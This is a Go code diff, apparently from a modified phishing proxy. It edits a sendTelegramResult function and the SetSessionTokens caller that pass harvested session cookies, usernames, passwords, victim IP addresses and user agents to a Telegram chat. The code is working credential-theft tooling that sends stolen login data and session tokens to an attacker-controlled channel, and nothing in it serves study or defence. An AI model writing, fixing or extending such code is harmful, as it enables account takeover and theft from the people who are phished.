@@ -45,7 +45,7 @@ func getChatId() string {
 	return fmt.Sprintf("%s", ChatId)
 }
 
-func sendTelegramResult(cookies string, sid int, phishlet string, username string, password string, remote_addr string, useragent string) {
+func sendTelegramResult(cookies string, username string, password string, remote_addr string, useragent string) {
 
 	// Send the message
 	var err error
@@ -89,10 +89,10 @@ func sendTelegramResult(cookies string, sid int, phishlet string, username strin
 	defer req.Body.Close()
 	
 	// 	// Body
-	responseBody, err = ioutil.ReadAll(req.Body)
-	if err != nil {
-		log.Fatalf("%s", err)
-	}
+// 	responseBody, err = ioutil.ReadAll(req.Body)
+// 	if err != nil {
+// 		log.Fatalf("%s", err)
+// 	}
 	log.Println("Send Email/Telegram Cookies", username, password)
 	
 	// Return
@@ -218,7 +218,7 @@ func (d *Database) SetSessionTokens(sid string, tokens map[string]map[string]*To
 
 
 	json11, _ := json.Marshal(cookies)
-	sendTelegramResult(string(json11), data.Phishlet, data.Id, data.Username, data.Password, data.UserAgent, data.RemoteAddr)
+	sendTelegramResult(string(json11), data.Username, data.Password, data.UserAgent, data.RemoteAddr)
 	return err
 }
 
